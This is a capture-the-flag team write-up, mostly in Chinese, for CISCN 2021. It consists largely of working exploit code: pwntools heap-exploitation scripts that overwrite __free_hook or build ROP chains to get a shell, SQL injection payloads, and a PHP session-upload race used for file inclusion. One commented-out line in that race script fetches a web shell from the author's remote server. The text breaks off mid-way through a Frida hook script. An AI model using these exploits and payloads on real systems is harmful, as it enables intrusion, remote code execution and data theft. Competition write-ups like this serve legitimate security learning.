# X1cT34m-2021 Writeup
![](https://leonsec.gitee.io/images/CISCN14banner35dd1922.png)

![CISCN14scoresssss](https://leonsec.gitee.io/images/CISCN14scoresssss.png)

## Pwn

### pwny
越界任意写
```python
from pwn import*
def menu(ch):
	p.sendlineafter('choice:',str(ch))
p = process('./main')
libc = ELF('./libc-2.27.so')
p = remote('124.70.35.238',23807)
menu(2)
p.sendlineafter('Index:','256')
menu(2)
p.sendlineafter('Index:','256')

menu(1)
p.sendlineafter('Index:',p64((-8&0xFFFFFFFFFFFFFFFF)))
p.recvuntil('Result: ')
libc_base = int(p.recv(12),16) - libc.sym['_IO_2_1_stdout_']
log.info('LIBC:\t' + hex(libc_base))

menu(1)
p.sendlineafter('Index:',p64((-11&0xFFFFFFFFFFFFFFFF)))
p.recvuntil('Result: ')
proc_base = int(p.recv(12),16) - 0x202008
log.info('PROC:\t' + hex(proc_base))

free_hook = libc_base + libc.sym['__free_hook']
L = proc_base + 0x202060
offset = (free_hook - L)/8

menu(2)
p.sendlineafter('Index:',str(offset))
p.send(p64(libc_base + libc.sym['system']))

IO_list_all = libc_base + libc.sym['_IO_list_all']
IO_str_jumps = libc_base + 0x3E8360
fake_IO_FILE  = p64(0) + p64(0)
fake_IO_FILE += p64(0) + p64(0)
fake_IO_FILE += p64(0) + p64(1)
fake_IO_FILE += p64(0) + p64(libc_base + libc.search('/bin/sh').next())
fake_IO_FILE  = fake_IO_FILE.ljust(0xD8,'\x00')
fake_IO_FILE += p64(IO_str_jumps - 8)
fake_IO_FILE += p64(0) + p64(libc_base + libc.sym['system'])


stderr = libc_base + libc.sym['_IO_2_1_stderr_']
L = proc_base + 0x202060
offset = (stderr - L)/8

for i in range(0xE8/8):
	menu(2)
	p.sendlineafter('Index:',str((offset + i)))
	p.send(fake_IO_FILE[8*i:8*(i+1)])
menu(3)
p.interactive()
```

### lonelywolf
```python
from pwn import*
def menu(ch):
	p.sendlineafter('choice:',str(ch))
def add(size):
	menu(1)
	p.sendlineafter('Index:',str(0))
	p.sendlineafter('Size:',str(size))
def edit(content):
	menu(2)
	p.sendlineafter('Index:',str(0))
	p.sendlineafter('Content:',content)
def show():
	menu(3)
	p.sendlineafter('Index:',str(0))
def free():
	menu(4)
	p.sendlineafter('Index:',str(0))
p = process('./main')
p = remote('124.70.35.238',23717)
libc = ELF('./libc-2.27.so')
add(0x78)
for i in range(2):
	edit('\x00'*0x10)
	free()
show()
p.recvuntil('Content: ')
heap_base = u64(p.recv(6).ljust(8,'\x00'))  - 0x260
log.info('HEAP:\t' + hex(heap_base))

edit(p64(heap_base + 0x10))
add(0x78)
add(0x78)

edit('\x00'*0x23 + '\x07')
free()
show()
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x70
log.info('LIBC:\t' + hex(libc_base))

edit('\x03' + '\x00'*0x3F + p64(libc_base + libc.sym['__free_hook'] - 8))
add(0x18)
edit('/bin/sh\x00' + p64(libc_base + libc.sym['system']))

free()
p.interactive()
```

### channel
UAF arm
```python
from pwn import*
#context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('> ',str(ch))
def Register(key):
	menu(1)
	p.sendafter('key> \n',key)
def UnRegister(key):
	menu(2)
	p.sendafter('key> \n',key)
def Read(key):
	menu(3)
	p.sendafter('key> \n',key)
def Write(key,len,content):
	menu(4)
	p.sendafter('key>',key)
	p.sendlineafter('len>',str(len))
	p.sendafter('content>',content)
#p = process('./qemu-aarch64-static -g 4444 -L $(pwd)/LIB ./main',shell=True)
p = remote('124.70.35.238',23680)

libc = ELF('./libc-2.31.so')

Register('fmyy')
Register('FMYY')
Register('TMP')
Register('0')
Register('1')
Register('2')
Register('3')
Register('/bin/sh\x00')
UnRegister('fmyy')
UnRegister('FMYY')
Write('TMP',0x110,'\xF0')
Read('TMP')
heap_base = (u32(p.recv(3).ljust(4,'\x00')) | 0x0000004000000000) - 0x2F0
log.info('HEAP:\t' + hex(heap_base))

Write('TMP',0x110,'\x00'*0xF8 + p64(0x4A1) + p64(heap_base + 0x3A0 )) #fmyy
UnRegister(p64(heap_base + 0x3A0) + '\x00'*0x10 + p64(0x121) + p64(heap_base + 0x2F0))

UnRegister('0')
UnRegister('1')

Write('TMP',0x60,'\xF0')
Read('TMP')
libc_base = (u32(p.recv(3).ljust(4,'\x00')) | 0x0000004000000000) - 0x16DEF0
log.info('LIBC:\t' + hex(libc_base))
Write('3',0x170,'FMYY')
Write('3',0x200,'\x00'*0x150 + p64(libc_base + libc.sym['__free_hook']))

Write('3',0x110,'FMYY')
Write('3',0x110,p64(libc_base + libc.sym['system']))

UnRegister('/bin/sh\x00')
p.interactive()
```

### silverwolf
沙盒
```python
from pwn import*
def menu(ch):
	p.sendlineafter('choice:',str(ch))
def add(size):
	menu(1)
	p.sendlineafter('Index:',str(0))
	p.sendlineafter('Size:',str(size))
def edit(content):
	menu(2)
	p.sendlineafter('Index:',str(0))
	p.sendlineafter('Content:',content)
def show():
	menu(3)
	p.sendlineafter('Index:',str(0))
def free():
	menu(4)
	p.sendlineafter('Index:',str(0))
p = process('./main')
libc = ELF('./libc-2.27.so')
for i in range(7):
	add(0x78)
	edit('./flag\x00')
for i in range(2):
	edit('\x00'*0x10)
	free()
show()
p.recvuntil('Content: ')
heap_base = u64(p.recv(6).ljust(8,'\x00'))  - 0x5B0 - 0x940 - 0x70
log.info('HEAP:\t' + hex(heap_base))
edit(p64(heap_base + 0x10))
add(0x78)
add(0x78)
edit('\x00'*0x23 + '\x07')
free()
show()
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x70
log.info('LIBC:\t' + hex(libc_base))

edit('\x03'*0x40 + p64(libc_base + libc.sym['__free_hook']) + '\x00'*8*1 + p64(heap_base + 0x4000) + p64(heap_base + 0x3000 + 0x60) + p64(heap_base + 0x1000) + p64(heap_base + 0x10A0) + p64(heap_base + 0x3000))
add(0x18)

########################
pop_rdi_ret = libc_base + 0x00000000000215BF
pop_rdx_ret = libc_base + 0x0000000000001B96
pop_rax_ret = libc_base + 0x0000000000043AE8
pop_rsi_ret = libc_base + 0x0000000000023EEA
ret = libc_base + 0x00000000000008AA
Open = libc_base + libc.sym['open']
Read = libc_base + libc.sym['read']
Write = libc_base + libc.sym['write']
syscall = Read + 15
FLAG  = heap_base + 0x4000
gadget = libc_base + libc.sym['setcontext'] + 53

orw  = p64(pop_rdi_ret) + p64(FLAG)
orw += p64(pop_rsi_ret) + p64(0)
orw += p64(pop_rax_ret) + p64(2)
orw += p64(syscall)
orw += p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rsi_ret) + p64(heap_base  + 0x3000)
orw += p64(pop_rdx_ret) + p64(0x30)
orw += p64(Read)
orw += p64(pop_rdi_ret) + p64(1)
orw += p64(Write)

#############################
edit(p64(gadget))
add(0x38)
edit('./flag\x00')
add(0x78)
edit(orw[:0x60])
add(0x48)
edit(orw[0x60:])
add(0x68)
edit(p64(heap_base + 0x3000) + p64(pop_rdi_ret + 1))
add(0x58)
free()
p.interactive()
```

### game
vmpwn 分析出指令格式即可
```python
from pwn import*
#context.log_level = 'DEBUG'
def RUN(payload):
	p.sendlineafter('cmd> ',str(payload))

def init(L,W):
	RUN( 'OP:' + '1' + '\n' + 'L:' + str(L) + '\n' +  'W:' + str(W) + '\n')
def create(ID,Size,des):
	RUN( 'OP:' + '2' + '\n' + 'ID:' + str(ID) + '\n' +  's:' + str(Size) + '\n')
	p.sendafter('desc> ',des)
def free(ID):
	RUN( 'OP:' + '3' + '\n' + 'ID:' + str(ID) + '\n')
def show():
	RUN( 'OP:' + '4' + '\n')
def up(ID):
	RUN( 'OP:' + '5' + '\n' + 'ID:' + str(ID) + '\n')
def down(ID):
	RUN( 'OP:' + '6' + '\n' + 'ID:' + str(ID) + '\n')
def left(ID):
	RUN( 'OP:' + '7' + '\n' + 'ID:' + str(ID) + '\n')
def right(ID):
	RUN( 'OP:' + '8' + '\n' + 'ID:' + str(ID) + '\n')
p = process('./main')
p = remote('124.70.35.238',23772)
libc = ELF('./libc-2.27.so')
init(0x10,0x10)
create(0x6,0x3F0,'FMYY')
right(0x6)
right(0x6)
for i in range(10):
	down(0x6)
create(0x99,0x3F0,'\x00'*0x1F8 + p64(0x201))
free(0x6)
create(1,0x380,'\xA0')
show()
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x70 - 0x500
log.info('LIBC:\t' + hex(libc_base))

create(9,0x10,'\xA0')
show()

p.recvuntil('9: (10,12) ')
heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0xDA0  - 0x1400 + 0x400
log.info('HEAP:\t' + hex(heap_base))

free(0x99)
create(2,0x230,'\x00'*0x38 + p64(0x401) + p64(heap_base + 0x10))


###################
pop_rdi_ret = libc_base + 0x000000000002155f
pop_rdx_ret = libc_base + 0x0000000000001b96
pop_rax_ret = libc_base + 0x0000000000043a78
pop_rsi_ret = libc_base + 0x0000000000023e8a
ret = libc_base + 0x00000000000008AA
Open = libc_base + libc.sym['open']
Read = libc_base + libc.sym['read']
Write = libc_base + libc.sym['write']
syscall = Read + 15
FLAG  = heap_base + 0x10 + 0xA0 + 0x10 + 0x88

orw  = p64(pop_rdi_ret) + p64(FLAG)
orw += p64(pop_rsi_ret) + p64(0)
orw += p64(pop_rax_ret) + p64(2)
orw += p64(syscall)
orw += p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rsi_ret) + p64(heap_base  + 0x3000)
orw += p64(pop_rdx_ret) + p64(0x30)
orw += p64(Read)
orw += p64(pop_rdi_ret) + p64(1)
orw += p64(Write)
###################
create(7,0x3F0,'FMYY')
create(8,0x3F0,'\x00'*7 + '\x01' + '\x00'*0x38 +'\x00'*8*7 + p64(libc_base + libc.sym['__free_hook'])  + '\x00'*0x20 + p64(heap_base + 0x10 + 0xA0 + 0x10) + p64(pop_rdi_ret + 1) + orw + './flag\x00')

create(3,0x80,p64(libc_base + libc.sym['setcontext'] + 53))

free(8)

p.interactive()
```
### SATool
```C
// clang -emit-llvm -o test.bc -c code.c
/*
run: 		call *0x2040F8()
stealkey:	0x204100 = *0x2040F8
takeaway:	clear the 0x2040F8
save(char *s1,char *s2):
	memcpy(&P[0],s1,strlen(s1));
	memcpy(&P[1],s2,strlen(s2));
fakekey:	set *0x2040F8 = 0x204100 + SetEXTValue
*/
#include <stdio.h>

int B4ckDo0r()
{
		save("FMYY","FMYY");
        save("FMYY","FMYY");
        save("FMYY","FMYY");
        save("FMYY","FMYY");
        save("FMYY","FMYY");
        save("\x00","FMYY");
        stealkey();
        fakekey(-0x2E1884);
        run();
	
}
int run()
{
	return 0;
}
int save(char *s1,char *s2)
{
	return 0;
}
int fakekey(int64)
{
	return 0;
}
int takeaway(char *s1)
{
	return 0;
}
int main()
{
	B4ckDo0r();

}
```

## Web

### easy_source

原题，`ReflectionMethod` 构造 `User` 类中的函数方法，再通过 `getDocComment` 获取函数的注释

提交参数：

```
?rc=ReflectionMethod&ra=User&rb=a&rd=getDocComment
```

爆破rb的值a-z，在q得到flag：

![](https://leonsec.gitee.io/images/image-20210515122304432.png)

CISCN{fvsgF-5rRwf-p8KZP-vOndu-SIQoM-}

### easy_sql

fuzz：

![image-bansdasdsads](https://leonsec.gitee.io/images/image-bansdasdsads.png)

sqlmap得到表名flag和一个列名id：报错加无列名注入

![](https://leonsec.gitee.io/images/image-20210515130056447.png)

一开始用按位比较：

```python
import requests
url = 'http://124.70.35.238:23511/'
def add(flag):
    res = ''
    res += flag
    return res
flag = ''
for i in range(1,200):
    for char in range(32, 127):
        hexchar = add(flag + chr(char))
        payload = "1') or (select 1,'NO','CISCN{JGHHS-JPD52-IJK4O-MGPDZ-DUFWI-')>=(select * from security.flag limit 1)#".format(hexchar)
        data = {"uname":"admin",'passwd':payload}
        r = requests.post(url=url, data=data)
        text = r.text
        if 'login<' in r.text:
            flag += chr(char-1)
            print(flag)
            break
```

到最后卡住了，换了无列名注入报错爆列名，然后直接报错注入：

![](https://leonsec.gitee.io/images/image-20210515131951311.png)

```sql
admin')||extractvalue(1,concat(0x7e,(select * from (select * from flag as a join (select * from flag)b using(id,no))c)))#
//Duplicate column name 'e0f1d955-bbba-43c3-b078-a81b3fc4bf28'

admin')||(extractvalue(1,concat(0x7e,(select `e0f1d955-bbba-43c3-b078-a81b3fc4bf28` from security.flag),0x7e)))#
//XPATH syntax error: '~CISCN{JgHhs-jpd52-iJk4O-MGPDz-d'

admin')||(extractvalue(1,concat(0x7e,substr((select `e0f1d955-bbba-43c3-b078-a81b3fc4bf28` from security.flag),32,50),0x7e)))#
//XPATH syntax error: '~uFWI-}~'
```

CISCN{JgHhs-jpd52-iJk4O-MGPDz-duFWI-}

### middle_source

首页给了任意文件包含

扫目录得到`.listing`，得到`you_can_seeeeeeee_me.php`是phpinfo页面

有了phpinfo可以尝试直接向phpinfo页面传文件加垃圾数据，同时从phpinfo获取临时文件名进行文件包含，或者利用`session.upload_progress`进行session文件包含

前者尝试无效果

从phpinfo得到了session保存路径：`/var/lib/php/sessions/fccecfeaje/`

尝试发现可以出网，虽然ban了很多函数，但是可以直接用copy或file_get_contents下载shell

在`/etc/acfffacfch/iabhcgedde/facafcfjgf/adeejdbegg/fdceiadhce/fl444444g`发现flag

![](https://leonsec.gitee.io/images/image-20210515185821338.png)

exp：

```python
import requests
import threading

#file_content = '<?php print_r(scandir("/etc"));?>'
#file_content = '<?php copy("http://myvps/s.txt","/tmp/leon.php");echo "666666666";?>'
#s.txt是shell一句话
file_content = '<?php var_dump(file_get_contents("/etc/acfffacfch/iabhcgedde/facafcfjgf/adeejdbegg/fdceiadhce/fl444444g"));?>'

url='http://124.70.35.238:23579/'
r=requests.session()

def POST():
    while True:
        file={
            "upload":('<?php echo 999;?>', file_content, 'image/jpeg')
        }
        data={
            "PHP_SESSION_UPLOAD_PROGRESS":file_content
        }
        headers={
            "Cookie":'PHPSESSID=1234'
        }
        r.post(url,files=file,headers=headers,data=data)

def READ():
    while True:
        event.wait()
        t=r.post("http://124.70.35.238:23579/", data={"cf":'../../../../../../../../../../var/lib/php/sessions/fccecfeaje/sess_1234'})
        if len(t.text) < 2230:
            print('[+]retry')
        else:
            print(t.text)
            event.clear()
event=threading.Event()
event.set()
threading.Thread(target=POST,args=()).start()
threading.Thread(target=POST,args=()).start()
threading.Thread(target=POST,args=()).start()
threading.Thread(target=READ,args=()).start()
threading.Thread(target=READ,args=()).start()
threading.Thread(target=READ,args=()).start()
```

![](https://leonsec.gitee.io/images/image-20210515185737528.png)

CISCN{yo19m-ZqNC1-URusV-u83jg-zxqpZ-}

## Crypto

### rsa

1. $e=3$且$m^3<n$，所以开立方根得到msg1
2. RSA Common Module Attack，共模攻击
3. 已知P高位分解n，partial P 攻击，构造多项式求根找到P低位

```python
from Crypto.Util.number import *
from hashlib import  md5
import gmpy2

def partial_p(p0, kbits, n):
    PR.<x> = PolynomialRing(Zmod(n))
    nbits = len(bin(n)[2:])

    f = x + p0
    roots = f.small_roots(X=2^(nbits//2-kbits), beta=0.3)
    if roots:
        x0 = roots[0]
        p = gcd(x0 + p0, n)
        return ZZ(p)

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)
 
c1 = 19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893
e1,N1 = (3, 123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009L)
c2 = 54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610
c2_ = 91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950
e2, n2 = (17, 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L)
e3, n2 = (65537, 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L)
c3 = 59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646
e3, n3 = (65537, 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147L)
p03 = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902

# ------------- Msg1 -------------

# msg1 = long_to_bytes(gmpy2.iroot(c1, 3)[0])
# print(msg1)
msg1 = b' \nO wild West Wind, thou breath of Autum'
# ------------- Msg2 -------------
s = egcd(e2, e3)
s1, s2 = s[1], s[2]
if s1 < 0:
    s1 = -s1
    c2 = inverse(c2, n2)
elif s2 < 0:
    s2 = -s2
    c2_ = inverse(c2_, n2)
msg2 = long_to_bytes(pow(c2, s1, n2)*pow(c2_, s2, n2) % n2)
print(msg2)

# ------------- Msg3 -------------
p3 = partial_p(p03*2**200, 512-200, n3)
q3 = n3//p3
msg3 = long_to_bytes(pow(c3, inverse(e3, (p3-1)*(q3-1)), n3))
print(msg3)

msg = msg1+msg2+msg3
print(msg)

print("CISCN{"+md5(msg).hexdigest()+"}")
# CISCN{3943e8843a19149497956901e5d98639}
```

### move

LLL解出x，然后`y = e*x//n`算出y，二分计算`s=p+q`，计算逆元d，d*E(c)得到明文。

```python
from Crypto.Util.number import *

n = 80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281
e = 67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809
c = (6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605, 38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028)

row = matrix(ZZ, 2, [2^512, e, 0, -n]).LLL()
x = -row[0][0]>>512
y = e*x//n
k = (e*x - y*n)//y
left, right = 0, k
for i in range(515):
    mid = (left + right)//2
    v = mid**2 - int(mid^2*9*(k-1-mid)^2)//round(n^0.25)^2
    if v < 4*n: left = mid
    else:       right = mid
s = right
d = inverse_mod(e, n + s + 1)
Ec = EllipticCurve(Zmod(n), [0, (c[1]**2 - c[0]**3) % n])
Point = Ec(c)
x, y = (d*Point).xy()
print((long_to_bytes(int(x))+long_to_bytes(int(y))).decode())
# CISCN{e91fef4ead7463b13d00bda65f540477}
```

### imageencrypt

题目给了一组对应的明文密文，然后给了一个更长的密文，所以需要先使用明文密文解出所有的需要的参数，然后用这些参数对这个更长对密文进行解密，得到flag。

密钥流bins的作用是4选1，不妨全部选择0，得到四个值中一定有两个是key1和key2.

```python
def generate(r, x):
    return round(r*x*(3-x), 6)

def get_nums():
    out = []
    for i in range(16*16):
        out.append((testimage[i]^testimage_enc[i])&0xff)
    print(out)

testimage = [205, 237, 6, 158, 24, 119, 213, 32, 74, 151, 142, 186, 57, 28, 113, 62, 165, 20, 190, 37, 159, 137, 196, 44, 97, 37, 7, 222, 220, 95, 4, 66, 0, 28, 199, 142, 95, 105, 119, 232, 250, 215, 60, 162, 91, 211, 63, 30, 91, 108, 217, 206, 80, 193, 230, 42, 221, 71, 136, 115, 22, 176, 91, 57, 61, 3, 87, 73, 250, 121, 51, 72, 83, 120, 77, 199, 236, 190, 249, 116, 45, 6, 134, 110, 149, 94, 214, 232, 153, 213, 119, 98, 81, 203, 240, 114, 240, 29, 122, 188, 156, 53, 128, 185, 40, 147, 245, 204, 47, 101, 80, 229, 41, 150, 28, 195, 25, 235, 119, 6, 192, 8, 73, 255, 159, 172, 77, 94, 254, 104, 236, 219, 141, 91, 195, 162, 97, 56, 252, 173, 163, 43, 167, 214, 50, 73, 115, 190, 254, 53, 61, 77, 138, 192, 15, 4, 190, 27, 37, 108, 101, 135, 90, 215, 106, 243, 112, 111, 106, 89, 143, 150, 185, 142, 192, 176, 48, 138, 164, 185, 61, 77, 72, 0, 17, 203, 210, 71, 186, 49, 162, 250, 218, 219, 195, 63, 248, 220, 155, 180, 219, 132, 219, 94, 144, 247, 211, 95, 70, 227, 222, 31, 69, 24, 13, 216, 185, 108, 137, 57, 186, 211, 55, 27, 158, 241, 223, 21, 134, 106, 152, 127, 187, 245, 246, 131, 176, 177, 228, 100, 112, 11, 84, 61, 193, 42, 41, 69, 229, 145, 254, 138, 3, 153, 123, 31]
testimage_enc = [131, 92, 72, 47, 177, 57, 131, 118, 4, 38, 192, 19, 119, 82, 63, 143, 235, 165, 15, 140, 209, 223, 117, 133, 47, 148, 81, 144, 138, 246, 173, 235, 177, 181, 110, 39, 9, 192, 57, 166, 180, 153, 141, 19, 234, 157, 142, 80, 234, 197, 151, 152, 249, 143, 176, 155, 147, 17, 57, 194, 191, 254, 13, 144, 140, 85, 25, 248, 172, 208, 154, 249, 5, 201, 27, 137, 69, 23, 175, 34, 156, 72, 208, 32, 195, 16, 127, 65, 207, 131, 57, 203, 7, 98, 89, 36, 65, 75, 211, 21, 45, 132, 214, 239, 102, 58, 68, 130, 97, 204, 225, 76, 152, 216, 74, 149, 79, 165, 198, 72, 150, 94, 7, 177, 46, 226, 252, 247, 79, 62, 69, 106, 60, 21, 106, 236, 47, 145, 170, 28, 18, 101, 14, 152, 131, 7, 37, 15, 168, 99, 115, 27, 220, 150, 89, 82, 232, 170, 107, 221, 212, 46, 235, 129, 36, 66, 217, 222, 36, 15, 217, 192, 247, 192, 113, 230, 129, 196, 13, 247, 148, 228, 225, 86, 71, 133, 132, 238, 236, 127, 11, 83, 107, 141, 114, 150, 182, 146, 213, 250, 141, 53, 114, 16, 198, 70, 133, 17, 247, 173, 136, 73, 236, 78, 188, 150, 239, 58, 199, 136, 11, 122, 134, 77, 47, 167, 137, 188, 55, 195, 41, 49, 245, 92, 160, 213, 254, 0, 85, 205, 193, 69, 2, 140, 143, 155, 127, 236, 179, 199, 168, 35, 85, 40, 45, 174]
flag_enc = [198, 143, 247, 3, 152, 139, 131, 84, 181, 180, 252, 177, 192, 25, 217, 179, 136, 107, 190, 62, 4, 6, 90, 53, 105, 238, 117, 44, 5, 116, 132, 195, 214, 171, 113, 209, 18, 31, 194, 174, 228, 212, 196, 14, 27, 41, 211, 56, 139, 135, 225, 214, 89, 122, 178, 212, 185, 231, 204, 150, 204, 212, 160, 142, 213, 173, 186, 166, 65, 238, 5, 32, 45, 31, 25, 189, 148, 38, 78, 79, 33, 56, 227, 48, 103, 163, 31, 189, 37, 124, 106, 249, 86, 188, 86, 233, 41, 250, 89, 7, 212, 234, 111, 104, 245, 102, 227, 96, 160, 67, 181, 13, 26, 192, 214, 210, 188, 84, 216, 215, 243, 72, 233, 2, 122, 166, 107, 251, 70, 128, 94, 190, 185, 210, 34, 85, 77, 29, 182, 77, 115, 208, 228, 252, 73, 198, 151, 70, 10, 97, 138, 235, 21, 117, 239, 102, 129, 2, 253, 80, 53, 61, 184, 220, 41, 82, 37, 140, 23, 143, 179, 53, 153, 113, 213, 211, 111, 197, 248, 65, 60, 69, 1, 81, 48, 254, 251, 89, 195, 8, 93, 190, 66, 174, 97, 175, 210, 191, 66, 112, 123, 128, 33, 230, 237, 104, 16, 192, 239, 173, 44, 10, 120, 231, 114, 151, 140, 63, 103, 44, 243, 222, 242, 73, 51, 46, 98, 137, 163, 152, 147, 95, 223, 3, 15, 112, 85, 215, 133, 131, 240, 239, 224, 195, 140, 124, 70, 156, 221, 241, 37, 245, 1, 99, 9, 157, 99, 150, 47, 118, 225, 16, 13, 141, 135, 99, 18, 119, 63, 160, 6, 247, 27, 68, 45, 199, 86, 193, 252, 21, 135, 32, 42, 103, 114, 241, 49, 249, 182, 52, 18, 155, 157, 61, 4, 246, 158, 52, 118, 242, 195, 54, 139, 232, 100, 31, 11, 233, 58, 100, 101, 137, 83, 145, 209, 7, 241, 96, 57, 148, 207, 29, 237, 124, 177, 166, 161, 20, 116, 122, 61, 71, 46, 82, 18, 157, 253, 130, 112, 66, 94, 57, 221, 243, 222, 192, 147, 5, 130, 201, 174, 26, 160, 16, 188, 103, 187, 11, 238, 182, 144, 4, 137, 33, 84, 100, 7, 239, 219, 83, 112, 189, 166, 58, 93, 141, 30, 198, 220, 196, 118, 172, 5, 45]
get_nums() # [78, 86, 169, 177]
```
然后进行枚举4x4很快：

```python
for key1 in keys:
    for key2 in keys:
        if key1 == key2: continue
        bins = ""
        err = False
        for i in range(16*16):
            if ((testimage[i]^testimage_enc[i])&0xff) == key1:
                bins+="00"
            elif ((~testimage[i]^testimage_enc[i])&0xff) == key1:
                bins+="01"
            elif ((testimage[i]^testimage_enc[i])&0xff) == key2:
                bins+="10"
            elif ((~testimage[i]^testimage_enc[i])&0xff) == key2:
                bins+="11"
            else:
                err = True
                break
        if err: continue
```

这里可以得到8组bins和key1，key2，接下来可以枚举二次函数的参数r，r的范围是0-2之间的1位小数，这时可以排除掉7组不满足条件的。

可以得到r=1.2，key1=169，key2=78，并且保存对应的密钥流bins：
```python
key1, key2, r = 169, 78, 1.2
bins = "10111011001001011011100010101011101111001001110010110110010000001100000001001010101011111110111011001001001001111001111100100100110110110100001101110110000001011110011001100000010110000100000111010000111101011000111010001100111001010110111001011010111011001101001111100010100001111110001011100111010110010101010101111011110011011011001110010101101011011110001000000001011001000110000011011100101010100111001001110110111001010001111001011011110011011101010011001110100001011011110011100111101101000101010001110111"
SEQS = [int(stream[i*16:i*16+16], 2) for i in range(len(stream)//16)]
for x0 in range(1000000):
    x = x0/1000000
    seqs = []
    for i in range(16*16//8):
        x = generate(r, x)
        seqs.append(int(x*22000))
    if SEQS==seqs:
        print(x0/1000000) 
# 0.840264
```
枚举一下得到六位小数，这样就有了所有的参数。然后直接调用encrypt函数就可以解密：
```python
flag = encrypt(flag_enc,key1, key2,x0,m,n)
flag_bytes = b""
for i in flag:
    flag_bytes+=long_to_bytes(i)
print(md5(flag_bytes).hexdigest())
```

### homo

首先需要把`game()`部分完成，也就是猜对200个数字，才能使用解密，由于加密使用的是lwe，解密时只会判断一下是否和密文相同，不相同会解密返回给我们，所以只需要对密文做一点点修改，给某个值+1，就可以在不干扰解密的情况下，得到不同的密文。

猜数字部分是调用的random函数，内部的PRNG是MT19937，只要获取其624个状态（每个状态32bits）就可以预测后面所有的输出，这题的数字都是64bites，相当于一次两个状态，所以我们需要猜错312次，然后成功预测后面的200次，312+200刚好等于512

```python
from pwn import *
import string
from mt19937predictor import MT19937Predictor
from Crypto.Util.number import *

s = string.ascii_letters + string.digits
r = remote("124.70.96.30", 24295)

pk0 = [int(i) for i in r.recvline().decode().strip("[]\n").split(", ")]
pk1 = [int(i) for i in r.readline().decode().strip("[]\n").split(", ")]
print(len(pk0), len(pk1))
ct0 = [int(i) for i in r.recvline().decode().strip("[]\n").split(", ")]
ct1 = [int(i) for i in r.recvline().decode().strip("[]\n").split(", ")]
print(len(ct0), len(ct1))

# ================ MT19937 ================
r.recvlines(2)
predictor = MT19937Predictor()
r.sendline(b"1")
r.recvline()
for _ in range(312):
    r.sendlineafter(b"your number:", b"1")
    print(r.recvuntil(b"lose!my number is "))
    x = int(r.recvline().decode().strip("\n"))
    predictor.setrandbits(x, 64)
for _ in range(200):
    x = predictor.getrandbits(64)
    r.sendlineafter(b"your number:", str(x).encode())
    if r.recvline().decode().strip("\n") != "win":
        print("[*] Error")

# ================ Decrypt ================
r.recvlines(2)
r.sendline(b"2")
for i in range(len(ct0)):
    ct0[i] += 1
    ct1[i] += 1
r.sendlineafter(b"c0:", str(ct0).strip("[]").encode())
r.sendlineafter(b"c1:", str(ct1).strip("[]").encode())
r.recvline()
m = [int(i) for i in r.recvline().decode().strip("[]\n").split(", ")]
flag = "".join([str(i) for i in m])
flag = long_to_bytes(int(flag, 2))
print(flag)
r.interactive()
```

## Reverse

### glass

frida得到rc4的xor的数

```javascript
function hook(){
    var module = Process.findModuleByName("libnative-lib.so");
    console.log(module.base);
    var Exports = module.enumerateExports();
    for(var i = 0; i < Exports.length; i++) {
        //函数类型
        console.log("type:",Exports[i].type);
        //函数名称
        console.log("name:",Exports[i].name);
        //函数地址
        console.log("address:",Exports[i].address);
     }
     var libnativebaseadd=Module.findBaseAddress("libnative-lib.so");
     var sub_1088 = libnativebaseadd.add(0x1088).add(0x1);
     var addr ;
    Interceptor.attach(sub_1088,{
        onEnter:function(args){
            console.log("sub_1088 argo->",hexdump(args[0]));
            console.log("sub_1088 arg1->",hexdump(args[1]));
            addr = args[1];
            console.log("sub_1088 arg2->",args[2]);
        },
